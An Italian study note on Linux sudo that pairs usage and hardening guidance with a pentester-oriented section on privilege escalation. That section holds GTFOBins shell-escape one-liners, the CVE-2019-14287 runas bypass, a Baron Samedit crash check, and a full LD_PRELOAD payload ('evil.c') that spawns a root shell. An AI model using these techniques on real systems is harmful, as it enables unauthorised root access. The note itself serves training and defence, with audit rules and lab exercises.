---
tipo: entita
tag: [linux]
fase: 1
fonti: 6
aggiornato: 2026-07-02
stato: maturo
aliases: ["sudo"]

---

# sudo

## In breve

**sudo** è il meccanismo standard di Linux per delegare l'esecuzione di comandi con i privilegi di un altro utente (di norma **root**), governato dalla policy in `/etc/sudoers`. È un binario **SUID-root** e, dal lato offensivo, `sudo -l` è uno dei primissimi comandi di enumerazione: una singola regola `NOPASSWD` su un binario sfruttabile porta spesso a [[Privilege Escalation Linux]] immediata.

## Cos'è

**sudo** (Substitute User DO) è un comando Linux che permette a un utente normale di eseguire uno specifico comando con i privilegi di un altro utente, tipicamente **root**. La configurazione di chi può fare cosa è definita nel file `/etc/sudoers`.

## Uso tipico

```bash
# Esegui un comando come root
sudo apt update

# Esegui un comando come utente specifico
sudo -u www-data ls /var/www/

# Apri una shell root (se permesso)
sudo -s
sudo /bin/bash

# Mostra cosa puoi fare con sudo (fondamentale per l'enumerazione!)
sudo -l

# Esegui l'ultimo comando con sudo
sudo !!

# Visualizza il file sudoers (richiede root)
sudo cat /etc/sudoers
sudo visudo   # editor sicuro per sudoers
```

### Output tipico di `sudo -l`

```
User mario may run the following commands on host:
    (ALL : ALL) NOPASSWD: /usr/bin/find
    (ALL) /usr/bin/vim
```

Questo output dice che `mario` può eseguire `find` come root **senza password** e `vim` con password.

## Quando si usa

In sicurezza informatica, `sudo -l` è uno dei **primi comandi** da eseguire dopo aver ottenuto accesso a un sistema, perché rivela immediatamente possibili vettori di [[Privilege Escalation Linux]].

Se un binario "innocuo" (come `find`, `vim`, `python`, `less`) è eseguibile con sudo senza password, quasi sempre è sfruttabile per ottenere una shell root. GTFOBins documenta esattamente come.

## Note e trucchi

- `NOPASSWD` nella configurazione è il segnale più importante: significa che il comando gira come root senza richiedere la password dell'utente.
- Controlla GTFOBins (https://gtfobins.github.io/) per ogni binario che appare in `sudo -l`: troverai istruzioni passo passo per scalare i privilegi.
- La direttiva `env_keep` in sudoers permette di mantenere variabili d'ambiente come `LD_PRELOAD` nella sessione sudo — potente vettore di [[Variabili d'Ambiente|privesc via variabili d'ambiente]].
- In ambienti moderni, `sudo` registra ogni comando in `/var/log/auth.log` — utile per il [[Log Analysis]] in fase difensiva.

---

# Strato esperto operativo

## Leggere `sudo -l` come un pentester

Ogni riga è `(runas_user:runas_group) [TAG:] comando`. Cosa cercare, in ordine di valore:
```
(ALL : ALL) NOPASSWD: /usr/bin/find        # NOPASSWD + binario GTFOBins  → root immediato
(root) /usr/bin/vim                          # serve password, ma vim = shell escape
(ALL) NOPASSWD: /opt/script.sh               # script custom → leggine il contenuto (PATH/wildcard)
(ALL) NOPASSWD: /usr/bin/*                    # wildcard nel path → esegui qualsiasi binario lì
env_keep+=LD_PRELOAD                          # → injection di libreria (vedi sotto)
```
Segnali chiave:
- **`NOPASSWD:`** — esegui senza password (vettore più pulito).
- **runas `(ALL)` / `(ALL:ALL)`** — puoi impersonare *qualsiasi* utente, incluso root.
- **Wildcard `*`** nel path comando — bypassabile fornendo binari arbitrari nella dir.
- **`env_keep`** — variabili d'ambiente conservate attraverso sudo (LD_PRELOAD/LD_LIBRARY_PATH).
- **Assenza di `secure_path`** — il PATH dell'utente sopravvive → PATH hijack di comandi non assoluti.

## NOPASSWD abuse — esempi GTFOBins

Cerca ogni binario su GTFOBins (funzione `sudo`). Pattern ricorrenti:
```bash
sudo find . -exec /bin/sh \; -quit          # find
sudo vim -c ':!/bin/sh'                       # vim  (o :py3 / :lua)
sudo less /etc/profile                        # less → poi  !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'          # awk
sudo env /bin/sh                              # env
sudo python3 -c 'import os;os.system("/bin/sh")'
sudo nmap --interactive                       # nmap < 5.21 (modalità interattiva)
```

## sudoedit e CVE note

- **`sudoedit` / `sudo -e`**: apre file in un editor mantenendo il privilegio solo sulla scrittura del file target. Se in `sudoers` compare `sudoedit /path/*` con wildcard, può portare a edit di file arbitrari (path traversal).
- **CVE-2021-3156 — "Baron Samedit"** (heap-based buffer overflow in `sudoedit`/`sudo`): affligge **sudo < 1.9.5p2**. Sfruttabile da *qualsiasi* utente locale, **anche senza** essere in `sudoers`. Root diretto.
  ```bash
  sudo --version          # se < 1.9.5p2 → candidato
  sudoedit -s '\' $(python3 -c 'print("A"*1000)')   # crash check: "malloc(): ..." = vulnerabile
  ```
- **CVE-2019-14287 — runas bypass**: se `sudoers` permette `(ALL, !root) /bin/bash`, si bypassa con `sudo -u#-1 /bin/bash` (UID -1/4294967295 → 0). Affligge sudo < 1.8.28.
- **CVE-2023-22809 — sudoedit `--`**: editor extra via `EDITOR=vim -- /etc/sudoers` → modifica file non autorizzati.

## env_keep e LD_PRELOAD (walkthrough)

Se `sudo -l` mostra `env_keep+=LD_PRELOAD` e hai *almeno un* comando sudo:
```c
// evil.c
#include <stdlib.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
```
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so <comando_consentito>   # → shell root
```
Il linker dinamico carica `/tmp/evil.so` **prima** del binario; il costruttore `_init()` gira con EUID 0.

> [!warning] secure_path e timestamp_timeout
> `Defaults secure_path=...` in sudoers **azzera** il PATH dell'utente → blocca il PATH hijack via sudo (ma non quello via SUID/cron). `Defaults env_reset` (default) ripulisce l'ambiente: senza un `env_keep` esplicito, l'attacco LD_PRELOAD non parte.

## Meccanismo interno

`sudo` è esso stesso un **binario SUID-root** (`-rwsr-xr-x root root`): per questo può cambiare UID. Legge `/etc/sudoers` (+ `/etc/sudoers.d/`) via `sudoers` plugin, valida la policy, e se concessa chiama `setresuid()/setresgid()` per assumere l'identità `runas` prima di `execve()` del comando. La cache della password ("timestamp") vive in `/run/sudo/ts/<user>` per `timestamp_timeout` minuti (default 15).

## Detection engineering
- Ogni invocazione → `/var/log/auth.log` (Debian) o `/var/log/secure` (RHEL): `sudo: user : TTY=... ; COMMAND=...`. Falliti: `sudo: N incorrect password attempts` / `user NOT in sudoers`.
- **MITRE T1548.003** (Sudo and Sudo Caching). Sospetti: uso di `vim`/`find`/`awk` via sudo, `sudo -u#-1`, modifiche a `/etc/sudoers*`.
  ```bash
  auditctl -w /etc/sudoers -p wa -k sudoers_change
  auditctl -w /etc/sudoers.d/ -p wa -k sudoers_change
  ```
- Hardening: `Defaults secure_path`, `env_reset`, `requiretty`; niente wildcard nei comandi; evitare di concedere `vim`/`less`/`find`/interpreti; tenere `sudo` aggiornato (Baron Samedit).

## Troubleshooting (5 errori comuni)
1. **`sudo -l` chiede password che non ho** → cambia vettore (SUID, cron, capabilities). Non insistere.
2. **`LD_PRELOAD` ignorato** → manca `env_keep+=LD_PRELOAD`, oppure `secure_path`/`env_reset` lo strippa, oppure il binario è static.
3. **PATH hijack via sudo non funziona** → `secure_path` impostato: il PATH viene sovrascritto. Funziona solo senza secure_path.
4. **GTFOBins escape fallisce** → versione del binario diversa (es. `nmap --interactive` solo < 5.21); usa la variante alternativa elencata.
5. **Baron Samedit PoC "non vulnerabile"** → patchato (≥1.9.5p2) o build senza il path vulnerabile; verifica `sudo --version` esatta.

## Domande da colloquio
> **D: Perché `sudo` può elevare i privilegi?**
> È un binario **SUID-root**: all'esecuzione il suo EUID diventa 0, e dopo aver validato `/etc/sudoers` usa `setresuid()` per assumere l'identità richiesta prima di lanciare il comando.

> **D: Cosa rende `(ALL) NOPASSWD: /usr/bin/vim` un buco?**
> `vim` può eseguire comandi shell (`:!/bin/sh`, `:py3`). Eseguendolo come root via sudo senza password, l'escape apre una shell **root**. Vale per qualsiasi binario che esegue codice arbitrario (less, awk, find, interpreti).

> **D: Cos'è Baron Samedit?**
> CVE-2021-3156, heap buffer overflow in sudo < 1.9.5p2, sfruttabile da *qualsiasi* utente locale (anche fuori da sudoers) per ottenere root. Fix: aggiornare sudo.

> **D: Come blocchi il PATH hijack e LD_PRELOAD via sudo?**
> `Defaults secure_path=...` (PATH fisso, ignora quello utente) ed `env_reset` senza `env_keep` per LD_PRELOAD/LD_LIBRARY_PATH. Così l'ambiente dell'attaccante non sopravvive alla transizione sudo.

## Lab

- **[[TryHackMe]] – Linux PrivEsc** (`tryhackme.com/room/linuxprivesc`): il task dedicato a **sudo** ti fa partire da `sudo -l`, poi sfruttare binari consentiti (`nano`, `find`, `env`, `nmap`) e l'abuso di `LD_PRELOAD` tramite `env_keep`. Pratica: mappare ogni riga di `sudo -l` al pattern GTFOBins corrispondente.
- **[[TryHackMe]] – Linux Privilege Escalation** (percorso Jr Penetration Tester): laboratorio più ampio dove `sudo` è uno dei vettori accanto a SUID e cron; utile per allenare la scelta del vettore giusto.
- **[[OverTheWire Bandit]] – livelli 19-20**: pur essendo basati su [[SUID e SGID]] e non su `sudo`, allenano lo stesso concetto di "eseguire un comando con l'identità di un altro utente" e la logica di drop/mantenimento privilegi.
- **[[GTFOBins]] (esercizio a secco)**: prendi 5 binari a caso della tua VM (`sudo -l` in un lab), cercali sotto la funzione `sudo` su GTFOBins e verifica se e come diventano una shell root. Serve a costruire il riflesso "binario → escape".

## Collegamenti

- [[Privilege Escalation Linux]]
- [[Permessi Linux]]
- [[Utenti e Gruppi Linux]]
- [[Variabili d'Ambiente]]
- [[find]]
- [[Log Analysis]]
- GTFOBins

## Fonti

- Man page sudo: https://man7.org/linux/man-pages/man8/sudo.8.html
- Man page sudoers: https://man7.org/linux/man-pages/man5/sudoers.5.html
- GTFOBins – sudo: https://gtfobins.github.io/#+sudo
- HackTricks – Sudo Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
- Qualys — Baron Samedit (CVE-2021-3156): https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
- MITRE ATT&CK – Sudo and Sudo Caching (T1548.003): https://attack.mitre.org/techniques/T1548/003/
